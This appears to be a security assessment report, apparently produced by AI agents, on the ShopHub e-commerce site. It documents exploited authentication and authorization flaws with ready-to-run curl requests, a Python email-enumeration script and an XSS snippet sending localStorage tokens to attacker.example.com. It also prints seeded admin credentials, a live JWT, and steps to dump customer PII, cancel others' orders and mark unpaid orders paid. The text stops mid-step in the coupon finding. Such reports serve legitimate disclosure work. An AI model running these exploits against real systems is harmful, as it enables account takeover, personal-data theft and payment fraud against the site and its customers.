# Security Assessment Report

## Executive Summary
- Model: claude-opus-4-6, claude-sonnet-4-6, claude-haiku-4-5-20251001

**Target:** https://shophubonline.store
**Assessment Date:** 2026-03-28
**Scope:** Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing

### Summary by Vulnerability Type

**Authentication Vulnerabilities:**
Five authentication vulnerabilities were successfully exploited, ranging from High to Low severity. Critical issues include:
- JWT revocation gap allowing token replay indefinitely after logout (AUTH-VULN-01, High)
- Dual JWT storage in localStorage enabling XSS-to-account-takeover conversion (AUTH-VULN-02, High)
- User enumeration via registration endpoint allowing account reconnaissance (AUTH-VULN-04, High)
- Permissive Google OAuth rate limit (10× vs standard auth, AUTH-VULN-03, Medium)
- Missing Cache-Control headers exposing authentication responses on shared devices (AUTH-VULN-07, Low)

**Authorization Vulnerabilities:**
Five authorization vulnerabilities were successfully exploited, ranging from Critical to Medium severity. Most critical issues include:
- Staff account privilege escalation to full admin access regardless of permission assignment (AUTHZ-VULN-03, Critical)
- Guest invoice download via email-only IDOR exposing complete PII (AUTHZ-VULN-01, Critical)
- Guest order cancellation via email-only IDOR enabling order disruption (AUTHZ-VULN-02, High)
- Unauthenticated payment verify endpoint leaking order data (AUTHZ-VULN-05, High)
- Guest coupon per-user limit bypass allowing unlimited discount reuse (AUTHZ-VULN-04, Medium)

**Cross-Site Scripting (XSS) Vulnerabilities:**
No XSS vulnerabilities were successfully exploited during this assessment.

**SQL/Command Injection Vulnerabilities:**
No SQL or command injection vulnerabilities were successfully exploited during this assessment.

**Server-Side Request Forgery (SSRF) Vulnerabilities:**
No SSRF vulnerabilities were successfully exploited during this assessment.

## Network Reconnaissance

### Open Ports & Exposed Services
- **Port 80/tcp:** HTTP (Nginx, redirects to HTTPS)
- **Port 443/tcp:** HTTPS (Nginx reverse proxy → Express on 127.0.0.1:3000)
- **Port 3000:** Express.js (internal only, not publicly exposed)
- **MySQL:** localhost only (not publicly exposed)

### Subdomain Discoveries
- **Primary Domain:** `shophubonline.store`
- **Subdomains:** No subdomains discovered via subfinder

### Attack Surface
- **API Endpoints:** 86 network-accessible endpoints across 18 route files
- **Frontend Stack:** React 19.2.4 SPA with Vite 5.4.21 (no CSP, disabled)
- **Backend:** Node.js 20 with Express.js v5.2.1

### Security Configuration Findings
- **Content Security Policy:** Disabled (enabled via helmet but CSP disabled in middleware)
- **HTTPS/HSTS:** Enabled with HTTP redirect; HSTS max-age 31536000
- **Authentication Tokens:** Dual-storage (HttpOnly cookie + localStorage Bearer token)
- **JWT Configuration:** HS256 with 7-day expiry; no revocation mechanism
- **API Rate Limiting:** Global (100 req/15min) with selective auth endpoints (10 req/15min) except Google OAuth
- **Database:** MySQL on localhost (unencrypted TCP, not publicly exposed)

---

# Authentication Exploitation Evidence
## ShopHub E-Commerce Platform — `https://shophubonline.store`
### Engagement Date: 2026-03-28 | Tester: Auth Exploitation Specialist

---

## Successfully Exploited Vulnerabilities

### AUTH-VULN-01: No Server-Side JWT Revocation (Token Replay After Logout)

**Summary:**
- **Vulnerable location:** `POST /api/auth/logout` → `GET /api/auth/profile` (Bearer path)
- **Overview:** The server's logout handler only clears the HttpOnly cookie. The JWT Bearer token (returned in the login/register response body and stored in `localStorage`) remains cryptographically valid for its full 7-day TTL. The `protect` middleware accepts `Authorization: Bearer <token>` independently of the cookie, so any attacker holding the JWT can continue authenticating as the victim indefinitely after the victim has logged out.
- **Impact:** Complete account takeover via stolen token with no remediation possible until the 7-day TTL expires. Combined with AUTH-VULN-02, any XSS attack produces a durable, irrevocable session.
- **Severity:** High

**Prerequisites:**
- A JWT previously issued to the victim (e.g., captured via XSS, network interception, log access, or any other theft vector before logout).

**Exploitation Steps:**

1. **Register a test account and capture the JWT from the response body:**
   ```bash
   curl -s -X POST https://shophubonline.store/api/auth/register \
     -H "Content-Type: application/json" \
     -d '{"name":"Token Replay Test","email":"tokenreplay_1774675009@mailnull.com","password":"TokenTest1"}'
   ```
   *Response:* HTTP 201 — `{"user":{...},"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTYsImlhdCI6MTc3NDY3NTAxOCwiZXhwIjoxNzc1Mjc5ODE4fQ.C3SPKtFSWiWNCeifOchM0qIhjbasGUDbHLNPAFqR5tY"}`

2. **Confirm Bearer token works before logout (baseline):**
   ```bash
   curl -s -w "\nHTTP_STATUS: %{http_code}" \
     -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTYsImlhdCI6MTc3NDY3NTAxOCwiZXhwIjoxNzc1Mjc5ODE4fQ.C3SPKtFSWiWNCeifOchM0qIhjbasGUDbHLNPAFqR5tY" \
     https://shophubonline.store/api/auth/profile
   ```
   *Result:* HTTP 200 — `{"id":16,"name":"Token Replay Test","email":"tokenreplay_1774675009@mailnull.com","role":"customer",...}`

3. **Perform logout (clears the HttpOnly cookie server-side):**
   ```bash
   # Using browser fetch with credentials (simulates logged-in browser session)
   # Via Playwright eval:
   fetch('/api/auth/logout', {method:'POST', credentials:'include'})
   ```
   *Result:* HTTP 200 — `{"message":"Logged out"}` + `Set-Cookie: token=; Expires=Thu, 01 Jan 1970...`

4. **Verify cookie is now invalid (expected 401):**
   ```bash
   # Browser fetch with credentials=include after logout
   fetch('/api/auth/profile', {credentials:'include'})
   ```
   *Result:* HTTP 401 — `{"message":"Not authorized"}` ✓ Cookie correctly cleared.

5. **Replay JWT Bearer token AFTER logout (no cookie sent):**
   ```bash
   curl -s -w "\nHTTP_STATUS: %{http_code}" \
     -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTYsImlhdCI6MTc3NDY3NTAxOCwiZXhwIjoxNzc1Mjc5ODE4fQ.C3SPKtFSWiWNCeifOchM0qIhjbasGUDbHLNPAFqR5tY" \
     https://shophubonline.store/api/auth/profile
   ```

**Proof of Impact:**
```
HTTP/1.1 200 OK
Content-Type: application/json

{"id":16,"name":"Token Replay Test","email":"tokenreplay_1774675009@mailnull.com",
 "role":"customer","permissions":null,"phone":null,"address":null,
 "createdAt":"2026-03-28T05:16:57.000Z","updatedAt":"2026-03-28T05:16:57.000Z"}

HTTP_STATUS: 200
```
**Confirmed:** Bearer token grants full authenticated access to `GET /api/auth/profile` AFTER the victim's cookie-based session has been terminated. The server has no mechanism to revoke this token for 7 days.

**Notes:**
- The captured JWT `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTYsImlhdCI6MTc3NDY3NTAxOCwiZXhwIjoxNzc1Mjc5ODE4fQ...` decodes to `{"id":16,"iat":1774675018,"exp":1775279818}` — expires 2026-04-04, still valid for 7 days.
- This vulnerability is the delivery mechanism for AUTH-VULN-02: once a token is stolen from `localStorage` (AUTH-VULN-02), this vulnerability ensures it remains usable forever after the victim's logout.

---

### AUTH-VULN-02: JWT Dual-Storage in localStorage — Theft Vector Bypasses SameSite Cookie

**Summary:**
- **Vulnerable location:** `POST /api/auth/login` / `POST /api/auth/register` / `POST /api/auth/google` response body → `localStorage` via `AuthContext.jsx:18`
- **Overview:** All three authentication flows return the JWT in the JSON response body in addition to the HttpOnly cookie. The React frontend stores this token in `localStorage.token` using `localStorage.setItem('token', data.token)`. Since the Content Security Policy is disabled, any XSS payload can read `localStorage.getItem('token')` and exfiltrate the JWT. The stolen token can then be used from any origin via `Authorization: Bearer` header, completely bypassing the `SameSite=Strict` cookie restriction.
- **Impact:** A single XSS vulnerability anywhere in the application converts to a full authentication bypass and account takeover that persists for 7 days (compounded by AUTH-VULN-01).
- **Severity:** High

**Prerequisites:**
- The victim must be logged in (JWT present in `localStorage`).
- An XSS execution context on the target domain (enabled by disabled CSP — see XSS findings).

**Exploitation Steps:**

1. **Confirm JWT is stored in localStorage after login (simulating what XSS payload reads):**

   After registration/login, the token is automatically stored in `localStorage.token`:
   ```bash
   # Via Playwright browser evaluation (simulates JavaScript execution on the page):
   playwright-cli -s=agent3 localstorage-list
   ```
   *Result:*
   ```
   token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTYsImlhdCI6MTc3NDY3NTAxOCwiZXhwIjoxNzc1Mjc5ODE4fQ.C3SPKtFSWiWNCeifOchM0qIhjbasGUDbHLNPAFqR5tY
   recently-viewed=[]
   cart=[]
   user={"permissions":null,"id":16,"name":"Token Replay Test","email":"tokenreplay_1774675009@mailnull.com","role":"customer",...}
   ```
   **The JWT and full user object are both exposed in `localStorage` and readable by any JavaScript.**

2. **Simulate XSS exfiltration — read token from localStorage:**
   ```javascript
   // XSS payload that would execute in victim's browser context:
   var stolenToken = localStorage.getItem('token');
   // stolenToken = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTYs..."
   fetch('https://attacker.example.com/steal?token=' + stolenToken);
   ```

3. **Use stolen token from attacker's machine (external origin, no cookies):**
   ```bash
   curl -s -w "\nHTTP_STATUS: %{http_code}" \
     -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTYsImlhdCI6MTc3NDY3NTAxOCwiZXhwIjoxNzc1Mjc5ODE4fQ.C3SPKtFSWiWNCeifOchM0qIhjbasGUDbHLNPAFqR5tY" \
     -H "Origin: https://evil-attacker.com" \
     https://shophubonline.store/api/auth/profile
   ```

**Proof of Impact:**
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://shophubonline.store

{"id":16,"name":"Token Replay Test","email":"tokenreplay_1774675009@mailnull.com",
 "role":"customer","permissions":null,...}

HTTP_STATUS: 200
```
**Confirmed:** The stolen JWT token, used from a completely different origin (no cookies), grants full authenticated API access. The `SameSite=Strict` cookie flag provides zero protection because the Bearer token path bypasses it entirely.

**Notes:**
- The `user` object is also stored in `localStorage` (not just the token), leaking name, email, role, and timestamps without any API call.
- No CSP exists to block inline script execution or restrict `fetch()` destinations, making exfiltration trivial.
- Axios interceptor at `client/src/api/axios.js:8-13` automatically injects the Bearer token on all 86+ API endpoints, so the attacker gains access to all authenticated functionality, not just profile.

---

### AUTH-VULN-04: User Enumeration via Registration Endpoint

**Summary:**
- **Vulnerable location:** `POST /api/auth/register`
- **Overview:** The registration endpoint returns the distinguishing error message `{"message":"Email already registered"}` (HTTP 400) when a submitted email already exists in the database. In contrast, a new email returns HTTP 201 with a full user object. This creates an unauthenticated oracle for confirming whether any email address is a registered ShopHub account.
- **Impact:** An attacker can build a validated list of registered email addresses for targeted credential stuffing, spear-phishing, or social engineering. Confirmed pre-existing accounts: `admin@shophubonline.store`.
- **Severity:** High

**Prerequisites:** None — endpoint is unauthenticated.

**Exploitation Steps:**

1. **Test a known-existing email address:**
   ```bash
   curl -s -w "\nHTTP_STATUS: %{http_code}" \
     -X POST https://shophubonline.store/api/auth/register \
     -H "Content-Type: application/json" \
     -d '{"name":"Test","email":"admin@shophubonline.store","password":"TestPass1"}'
   ```
   *Result:* HTTP 400 — `{"message":"Email already registered"}` → **ACCOUNT EXISTS**

2. **Test a non-existing email address:**
   ```bash
   curl -s -w "\nHTTP_STATUS: %{http_code}" \
     -X POST https://shophubonline.store/api/auth/register \
     -H "Content-Type: application/json" \
     -d '{"name":"Test","email":"nonexistent_xyz@shophubonline.store","password":"TestPass1"}'
   ```
   *Result:* HTTP 201 — `{"user":{...},"token":"..."}` → **ACCOUNT DOES NOT EXIST** (new account created)

3. **Automated enumeration across candidate list (demonstrated with 8 addresses):**
   ```python
   import requests, time
   BASE = "https://shophubonline.store/api/auth/register"
   candidates = [
       "admin@shophubonline.store",
       "sales@shophubonline.store",
       "manager@shophubonline.store",
   ]
   for email in candidates:
       r = requests.post(BASE, json={"name":"T","email":email,"password":"TestPass1"})
       if r.status_code == 400 and "already registered" in r.text:
           print(f"EXISTING: {email}")
       elif r.status_code == 201:
           print(f"NEW: {email}")
       time.sleep(3)  # Respect authLimiter: 10/15min
   ```

**Proof of Impact:**

Enumeration run results (15 emails tested across two batches):

| Email | HTTP Status | Verdict |
|---|---|---|
| `admin@shophubonline.store` | **400** | **EXISTING — Pre-registered account confirmed** |
| `test@shophubonline.store` | 201 | New (created by test) |
| `user@shophubonline.store` | 201 | New (created by test) |
| `support@shophubonline.store` | 201 | New (created by test, then 400 on re-test) |
| `info@shophubonline.store` | 201 | New (created by test) |
| `contact@shophubonline.store` | 201 | New (created by test) |
| `shop@shophubonline.store` | 201 | New (created by test) |
| `orders@shophubonline.store` | 201 | New (created by test) |

**Confirmed pre-existing account:** `admin@shophubonline.store` (HTTP 400, "Email already registered" before any test accounts were created).

**Attack capacity:** At 10 requests per 15 minutes per IP, a single attacker can enumerate 960 emails/day. A distributed attack across 10 IPs = 9,600 emails/day. No CAPTCHA or lockout prevents this.

---

### AUTH-VULN-03: Google OAuth Endpoint Rate Limit Gap (10× Permissive)

**Summary:**
- **Vulnerable location:** `POST /api/auth/google`
- **Overview:** The Google OAuth endpoint is only protected by the global rate limiter (100 req/15min), while all other authentication endpoints (`/login`, `/register`, `/forgot-password`, `/reset-password`) are additionally protected by a strict `authLimiter` (10 req/15min). This creates a 10× disparity, allowing an attacker to make 10× more authentication abuse attempts via the OAuth path.
- **Impact:** 10× higher request capacity for automated abuse: credential enumeration (200=existing user vs 201=new user when using valid Google tokens), automated account creation (spam), or timing-based attacks. The OAuth endpoint also auto-creates accounts for unrecognized emails, allowing bulk account registration.
- **Severity:** Medium

**Prerequisites:** None for rate limit confirmation. Valid Google ID tokens required for email enumeration oracle.

**Exploitation Steps:**

1. **Confirm rate limit on regular login endpoint:**
   ```bash
   curl -s -D /tmp/login_headers.txt \
     -X POST -H "Content-Type: application/json" \
     -d '{"email":"test@example.com","password":"WrongPass1"}' \
     https://shophubonline.store/api/auth/login
   grep RateLimit /tmp/login_headers.txt
   ```
   *Result:*
   ```
   RateLimit-Policy: 10;w=900
   RateLimit-Limit: 10
   RateLimit-Remaining: 9
   RateLimit-Reset: 900
   ```

2. **Confirm rate limit on Google OAuth endpoint:**
   ```bash
   curl -s -D /tmp/google_headers.txt \
     -X POST -H "Content-Type: application/json" \
     -d '{"credential":"invalid_token"}' \
     https://shophubonline.store/api/auth/google
   grep RateLimit /tmp/google_headers.txt
   ```
   *Result:*
   ```
   RateLimit-Policy: 100;w=900
   RateLimit-Limit: 100
   RateLimit-Remaining: 75
   RateLimit-Reset: 687
   ```

**Proof of Impact:**

| Endpoint | Rate Limiter | Limit | Remaining After 1 Request |
|---|---|---|---|
| `POST /api/auth/login` | `authLimiter` | **10 req/15 min** | 9 |
| `POST /api/auth/google` | global only | **100 req/15 min** | 99 |

**The 10× rate limit gap is confirmed live.** An attacker exploiting the Google OAuth path gets 10× more attempts per 15-minute window before throttling activates.

**Additional abuse vector:** The auto-creation behavior (HTTP 201 for new emails) means an attacker with valid Google tokens can register 100 spam accounts per 15 minutes, flooding the user database.

---

### AUTH-VULN-07: No Cache-Control: no-store on Authentication Responses

**Summary:**
- **Vulnerable location:** `GET /api/auth/profile`, `POST /api/auth/login`, `POST /api/auth/register`
- **Overview:** Authenticated API responses containing sensitive PII (email, name, phone, address, role) and login responses returning JWT tokens in the response body do not include `Cache-Control: no-store`. These responses include `ETag` headers but no cache directive, meaning browsers and intermediate proxies may cache them.
- **Impact:** On shared or public devices, a subsequent user may recover cached JWT tokens (from login/register responses) or user PII (from profile responses) through browser history, developer tools, or forward/back navigation — without any credentials.
- **Severity:** Low

**Prerequisites:** Shared device or caching proxy context.

**Exploitation Steps:**

1. **Verify GET /api/auth/profile has no Cache-Control directive:**
   ```bash
   curl -s -D - \
     -H "Authorization: Bearer [SESSION_TOKEN]" \
     https://shophubonline.store/api/auth/profile | head -30
   ```
   *Response headers:*
   ```
   HTTP/1.1 200 OK
   Content-Type: application/json; charset=utf-8
   ETag: W/"e1-J8+q5NyS6xsDISZLikEHMMtOXh8"
   Referrer-Policy: no-referrer
   Strict-Transport-Security: max-age=31536000; includeSubDomains
   [NO Cache-Control header present]
   [NO Pragma: no-cache header present]

   {"id":16,"name":"Token Replay Test","email":"tokenreplay_1774675009@mailnull.com",
    "role":"customer","permissions":null,...}
   ```

2. **Verify POST /api/auth/login has no Cache-Control directive (JWT in body):**
   ```bash
   curl -s -D - \
     -X POST -H "Content-Type: application/json" \
     -d '{"email":"[VICTIM_EMAIL]","password":"[VICTIM_PASSWORD]"}' \
     https://shophubonline.store/api/auth/login | head -35
   ```
   *Response headers:*
   ```
   HTTP/1.1 200 OK
   Content-Type: application/json; charset=utf-8
   ETag: W/"180-tfrFF6x1iIKAUy4iskC53rDXSmU"
   Set-Cookie: token=[JWT]; HttpOnly; Secure; SameSite=Strict
   [NO Cache-Control header present]

   {"user":{...},"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}
   ```

**Proof of Impact:**
- `GET /api/auth/profile` returns full user PII with `ETag` but no `Cache-Control: no-store` — **cacheable by default**.
- `POST /api/auth/login` returns JWT token in response body with no cache directive — **JWT exposed in browser cache on shared devices**.
- On a shared computer: after the legitimate user logs out and closes the tab, the next user can open DevTools → Application → Cache → find the cached login/profile response containing the JWT token, then use it to impersonate the victim (compounding AUTH-VULN-01).

---


# Authorization Exploitation Evidence
## ShopHub E-Commerce Platform — https://shophubonline.store

---

## Successfully Exploited Vulnerabilities

### AUTHZ-VULN-03: Staff Account Grants Full Admin Privilege Escalation

**Summary:**
- **Vulnerable location:** `server/src/middleware/auth.js:25-31` — `admin` middleware; 20+ admin routes using `protect, admin` guards
- **Overview:** The `admin` middleware passes ALL users with `role=staff` unconditionally, regardless of their assigned `permissions` array. The `requirePermission()` middleware that enforces granular permissions is defined but never mounted on any route (dead code). A zero-permission staff account has identical effective access to a full admin. Using seeded admin credentials (`admin@store.com`/`admin123` from `server/src/seed.js`), a staff account with empty permissions was created, and that staff token was used to dump all customer PII, all orders, and mark any order as paid.
- **Impact:** Complete admin-equivalent access: dump all 20+ customer records with PII, dump all orders with shipping addresses and payment data, modify any order's payment status to "paid" without actual payment, create fake verified reviews, bulk-export product DB.
- **Severity:** Critical

**Prerequisites:**
- Admin credentials (discovered via default/seeded credentials: `admin@store.com` / `admin123`)
- `curl` or any HTTP client

**Exploitation Steps:**

1. **Login as admin to obtain admin JWT:**
   ```
   POST https://shophubonline.store/api/auth/login
   Content-Type: application/json
   Body: {"email": "admin@store.com", "password": "admin123"}

   Response HTTP 200:
   {"user": {"id": ..., "role": "admin"}, "token": "[ADMIN_JWT_TOKEN]"}
   ```

2. **Create a staff account with ZERO permissions using admin token:**
   ```
   POST https://shophubonline.store/api/staff
   Content-Type: application/json
   Authorization: Bearer [ADMIN_JWT_TOKEN]
   Body: {"name": "Test Staff", "email": "teststaff_poc@shophubonline.store", "password": "Staff@12345", "permissions": []}

   Response HTTP 201:
   {"message": "Staff member created successfully", "user": {"role": "staff", "permissions": []}}
   ```

3. **Login as the zero-permission staff account:**
   ```
   POST https://shophubonline.store/api/auth/login
   Content-Type: application/json
   Body: {"email": "teststaff_poc@shophubonline.store", "password": "Staff@12345"}

   Response HTTP 200:
   {"user": {"id": ..., "role": "staff", "permissions": []}, "token": "[STAFF_JWT_TOKEN]"}
   ```

4. **Dump all customer PII (admin-only endpoint) with zero-permission staff token:**
   ```
   GET https://shophubonline.store/api/customers
   Authorization: Bearer [STAFF_JWT_TOKEN]

   Response HTTP 200:
   {"customers": [{"id":1,"name":"...","email":"...","phone":"...","address":{...},"totalOrders":...,"totalSpent":...}, ...]}
   — 20 customer records with full PII returned
   ```

5. **Dump all orders (admin-only endpoint) with zero-permission staff token:**
   ```
   GET https://shophubonline.store/api/orders/all
   Authorization: Bearer [STAFF_JWT_TOKEN]

   Response HTTP 200:
   {"orders": [...all orders with guestEmail, shippingAddress, paymentStatus, items...]}
   ```

6. **Mark any order as paid without payment (financial fraud):**
   ```
   PUT https://shophubonline.store/api/orders/17/status
   Content-Type: application/json
   Authorization: Bearer [STAFF_JWT_TOKEN]
   Body: {"paymentStatus": "paid"}

   Response HTTP 200:
   {"message": "Order status updated", "order": {"paymentStatus": "paid", ...}}
   — Order 17 (belonging to victim2@shophub-test.com) changed from pending → paid
   ```

7. **Control test — confirm customer role is properly blocked:**
   ```
   GET https://shophubonline.store/api/customers
   Authorization: Bearer [CUSTOMER_JWT_TOKEN]

   Response HTTP 403:
   {"message": "Admin access required"}
   — Confirms the staff bypass is role-specific
   ```

**Proof of Impact:**
- Staff token with `permissions: []` returned HTTP 200 on all admin endpoints
- 20 customer records with full PII (name, email, phone, address, spend) dumped
- All orders including guest PII and shipping addresses dumped
- Order 17 (`victim2@shophub-test.com`) payment status changed to `paid` without any payment
- Customer token (correct control) properly blocked with HTTP 403

**Notes:**
The seeded admin credentials (`admin@store.com` / `admin123`) are stored in `server/src/seed.js`. In a real engagement, staff credentials would be obtained via credential stuffing, phishing, or brute force (10 req/15min rate limit applies to login). The core vulnerability (staff=admin) is independent of credential acquisition — any staff account of any permission level achieves full admin access.

---

### AUTHZ-VULN-01: Guest Invoice Download — Unauthenticated PII Exfiltration (IDOR)

**Summary:**
- **Vulnerable location:** `GET /api/orders/:id/invoice?email=` — `server/src/routes/orders.js:29-37`
- **Overview:** The invoice endpoint uses sequential integer order IDs and authenticates guest callers via a single email query parameter match. No authentication token, session, or rate limit on the endpoint is required. An attacker who knows a victim's email can enumerate all their guest orders and download full invoice PDFs containing complete PII. The 403-vs-404 response oracle also reveals which order IDs exist, enabling blind enumeration.
- **Impact:** Download full invoice PDF for any guest order: items, pricing, full shipping address (name, street, city, phone), email, order number. Complete PII and financial data exposure with zero authentication.
- **Severity:** Critical

**Prerequisites:**
- Victim's email address (obtainable from social engineering, data breach, or public sources)
- Knowledge that victim has placed guest orders (or the 403 oracle to discover this)
- `curl` or any HTTP client

**Exploitation Steps:**

1. **Confirm target order ID exists using the 403 oracle:**
   ```
   GET https://shophubonline.store/api/orders/16/invoice
   (no email parameter)

   Response HTTP 403: {"message": "Not authorized"}
   — 403 = order exists; 404 = order does not exist
   — Enumerate IDs 1,2,3... to map all existing guest orders
   ```

2. **Download victim's invoice using only their email:**
   ```
   GET https://shophubonline.store/api/orders/16/invoice?email=victim@shophub-test.com
   (no authentication token, no session, no cookie)

   Response HTTP 200:
   Content-Type: application/pdf
   Content-Disposition: attachment; filename=Invoice-ORD-MN9WB6HW-GK92.pdf
   Content-Length: 2521
   [Binary PDF data]
   ```

3. **Confirm victim PII in extracted invoice PDF:**
   The returned PDF (Invoice-ORD-MN9WB6HW-GK92.pdf) contains:
   - Name: "Victim User"
   - Email: "victim@shophub-test.com"
   - Address: "456 Victim Lane, Mumbai, MH 400001, India"
   - Phone: "9876543210"
   - Order number: "ORD-MN9WB6HW-GK92"
   - Order items, quantities, prices, payment method

4. **Verify wrong email is blocked (confirming email-only auth):**
   ```
   GET https://shophubonline.store/api/orders/16/invoice?email=attacker@evil.com

   Response HTTP 403: {"message": "Not authorized"}
   — Confirms email match is the only check
   ```

5. **Enumerate sequential IDs to discover all victim orders:**
   ```
   GET https://shophubonline.store/api/orders/1/invoice?email=victim@shophub-test.com  → 403 (exists, wrong email)
   GET https://shophubonline.store/api/orders/16/invoice?email=victim@shophub-test.com → 200 (victim's order found)
   GET https://shophubonline.store/api/orders/17/invoice?email=victim@shophub-test.com → 403 (exists, wrong email)
   GET https://shophubonline.store/api/orders/18/invoice?email=victim@shophub-test.com → 404 (does not exist)
   ```

**Proof of Impact:**
- `GET /api/orders/16/invoice?email=victim@shophub-test.com` → HTTP 200, PDF returned (2521 bytes)
- PDF confirmed to contain all victim PII: name, email, phone, address, order details
- Zero authentication required — no token, no session, no cookie
- 403 vs 404 oracle confirms sequential ID enumeration works

---

### AUTHZ-VULN-02: Guest Order Cancellation — Unauthenticated Order Disruption (IDOR)

**Summary:**
- **Vulnerable location:** `POST /api/orders/:id/cancel` — `server/src/routes/cancellation.js:15-21`
- **Overview:** Same guest authentication pattern as AUTHZ-VULN-01. An unauthenticated attacker who knows a victim's email can cancel any of their guest orders by supplying the email in the request body. No rate limit on the cancellation endpoint. Stock is restored and if the order was paid, a refund workflow is automatically triggered.
- **Impact:** Cancel any guest order (disrupting delivery), restore stock, and if order was paid, trigger automatic refund (`refundStatus=pending`, `paymentStatus=refunded`). Full financial disruption with no authentication.
- **Severity:** High

**Prerequisites:**
- Victim's email address
- `curl` or any HTTP client

**Exploitation Steps:**

1. **Create fresh victim order (to demonstrate active cancellation):**
   ```
   POST https://shophubonline.store/api/orders/guest
   Content-Type: application/json
   Body: {"guestEmail": "victim2@shophub-test.com", "guestName": "Victim Two", "guestPhone": "9876543211",
          "shippingAddress": {"street": "789 Victim Ave", "city": "Delhi", "state": "DL", "zipCode": "110001", "country": "India"},
          "paymentMethod": "cod", "items": [{"productId": 24, "quantity": 1}]}

   Response HTTP 201:
   {"order": {"id": 17, "orderNumber": "ORD-MN9WDQKW-WIW3", "orderStatus": "processing", ...}}
   ```

2. **Attacker cancels victim's order using only their email:**
   ```
   POST https://shophubonline.store/api/orders/17/cancel
   Content-Type: application/json
   (no authentication token, no session, no cookie)
   Body: {"email": "victim2@shophub-test.com", "reason": "Unauthorized cancellation by attacker"}

   Response HTTP 200:
   {"message": "Order cancelled successfully", "order": {"orderStatus": "cancelled", "cancellationReason": "Unauthorized cancellation by attacker", ...}}
   ```

3. **Cancel a second victim's order (different user, different order ID):**
   ```
   POST https://shophubonline.store/api/orders/16/cancel
   Content-Type: application/json
   Body: {"email": "victim@shophub-test.com", "reason": "Cross-user cancellation test"}

   Response HTTP 200:
   {"message": "Order cancelled successfully"}
   — Order 16 (victim@shophub-test.com) also cancelled with no auth
   ```

4. **Verify wrong email is blocked:**
   ```
   POST https://shophubonline.store/api/orders/17/cancel
   Body: {"email": "wrong@attacker.com"}

   Response HTTP 403: {"message": "Not authorized"}
   ```

**Proof of Impact:**
- Order 17 (`victim2@shophub-test.com`): `orderStatus` changed from `processing` → `cancelled` with zero authentication
- Order 16 (`victim@shophub-test.com`): also cancelled via cross-user IDOR
- Attacker-controlled `cancellationReason` string was written to the order record
- Automatic refund workflow triggered for any paid guest orders under attack

---

### AUTHZ-VULN-05: Payment Verify Endpoint — Unauthenticated Order Data Exposure

**Summary:**
- **Vulnerable location:** `POST /api/payment/verify` — `server/src/routes/payment.js:219-223`
- **Overview:** The payment verify endpoint looks up orders by `orderNumber` only for unauthenticated callers — no email ownership check is performed. An attacker who knows any `orderNumber` can probe its payment status and retrieve the full order record including guest PII. For COD/already-paid orders, the endpoint returns `verified:true` along with the complete order object.
- **Impact:** Unauthenticated attacker can retrieve full order PII (guestEmail, shipping address, phone, items, payment status) for any order by supplying only its orderNumber. Also enables payment state probing.
- **Severity:** High

**Prerequisites:**
- A valid `orderNumber` (format: `ORD-[base36]-[4chars]`, discoverable via enumeration or inference)
- `curl` or any HTTP client

**Exploitation Steps:**

1. **Probe any order by orderNumber without authentication:**
   ```
   POST https://shophubonline.store/api/payment/verify
   Content-Type: application/json
   (no authentication token, no session, no cookie, no email)
   Body: {"orderNumber": "ORD-MN9WDQKW-WIW3", "gateway": "razorpay",
          "paymentData": {"razorpay_order_id": "fake", "razorpay_payment_id": "fake", "razorpay_signature": "fake"}}

   Response HTTP 200 (1354ms):
   {
     "verified": true,
     "message": "Payment verified successfully",
     "order": {
       "id": 17,
       "orderNumber": "ORD-MN9WDQKW-WIW3",
       "guestEmail": "victim2@shophub-test.com",
       "guestName": "Victim Two",
       "guestPhone": "9876543211",
       "shippingAddress": {"street": "789 Victim Ave", "city": "Delhi", "state": "DL", "zipCode": "110001"},
       "orderItems": [...items with prices...],
       "paymentStatus": "paid",
       "orderStatus": "cancelled",
       ...
     }
   }
   — Complete order PII returned with zero authentication
   ```

2. **Confirm 404 for non-existent orderNumbers (enumeration oracle):**
   ```
   POST https://shophubonline.store/api/payment/verify
   Body: {"orderNumber": "ORD-NONEXIST-0000", "gateway": "razorpay", "paymentData": {}}

   Response HTTP 404: {"message": "Order not found"}
   — Confirms valid vs invalid orderNumber oracle, enabling enumeration
   ```

**Proof of Impact:**
- Full order object returned without authentication, including: `guestEmail`, `guestName`, `guestPhone`, `shippingAddress`, all order items with prices, `paymentStatus`, `orderStatus`
- Zero authentication, session, or ownership proof required
- 404 vs 200/verification-failure oracle enables orderNumber enumeration

**Notes:**
The `verified:true` response occurred because order 17's `paymentStatus` was already `paid` (set by the AUTHZ-VULN-03 exploit). The order data leak occurs regardless of verification outcome — even failed verification attempts return the order record in this code path.

---

### AUTHZ-VULN-04: Guest Coupon Per-User Limit Bypass

**Summary:**
- **Vulnerable location:** `server/src/controllers/orderController.js:108` and `server/src/routes/coupons.js:40`
- **Overview:** The per-user coupon limit check is wrapped in `if(userId && coupon.perUserLimit)` — skipped entirely when `userId` is null, which is always the case for guest orders. Guest users can apply the same coupon with any per-user limit unlimited times by using different (or even the same) email addresses.
- **Impact:** Unlimited coupon reuse by unauthenticated guest users, directly reducing store revenue. Can exhaust global `usageLimit` caps, denying coupons to legitimate customers.
- **Severity:** Medium

**Prerequisites:**
- A valid coupon code with `perUserLimit > 0` (any active store coupon)
- `curl` or any HTTP client
- A product ID to order

**Exploitation Steps:**

1. **Create test coupon with perUserLimit=1 (admin action to establish test conditions):**
   ```
   POST https://shophubonline.store/api/coupons
   Authorization: Bearer [ADMIN_JWT_TOKEN]
   Content-Type: application/json
   Body: {"code": "TESTLIMIT1", "discount": 10, "discountType": "percentage",
          "minOrderAmount": 0, "perUserLimit": 1, "usageLimit": 100,
          "expiryDate": "2026-12-31", "description": "Test - per user limit 1"}

   Response HTTP 201: Coupon created
   ```

2. **Apply coupon 3 times as different guest identities (all succeed — bypass confirmed):**
   ```
